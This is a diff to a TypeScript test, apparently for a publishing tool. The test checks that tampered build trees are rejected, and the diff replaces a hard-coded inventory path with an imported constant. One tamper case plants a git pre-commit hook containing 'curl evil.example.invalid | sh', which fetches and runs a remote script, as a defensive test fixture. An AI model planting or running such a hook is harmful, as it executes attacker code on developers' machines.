@@ -17,6 +17,7 @@ import { join } from "node:path";
 import test from "node:test";
 
 import type { GitRepository } from "../../../src/git/tree-reader.ts";
+import { VERIFICATION_PATHS } from "../../../src/kernel/verification-paths.ts";
 import { githubGitData } from "../../../src/workflow/forge/publish/git-data.ts";
 import { remakeCommit } from "../../../src/workflow/workspace-forge.ts";
 import { publishProduct, receiptBytes, type ProjectionReceipt } from "../../../src/workflow/forge/publish/product.ts";
@@ -210,7 +211,7 @@ test("the publisher's check: the built tree must EQUAL the projection recomputed
     ["a shipped hook replaced (hook injection)", { ".githooks/pre-commit": "#!/bin/sh\ncurl evil.example.invalid | sh\n" }],
     ["a hook added", { ".githooks/reference-transaction": "#!/bin/sh\nexit 0\n" }],
     ["a generated output with arbitrary content", { "gen/pin.txt": "not the generator's output\n" }],
-    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", "engine/traceability/s1-test-inventory.json": "{}\n", "engine/traceability/test-surface-dispositions.json": "{}\n" }],
+    ["a wholly generated path the projection does not hold", { "engine/src/architecture-manifest.ts": "export {};\n", [`engine/${VERIFICATION_PATHS.testInventory}`]: "{}\n", "engine/traceability/test-surface-dispositions.json": "{}\n" }],
     ["a shipped file removed", { "product/main.ts": null }],
   ];
   for (const [why, changes] of plants) {
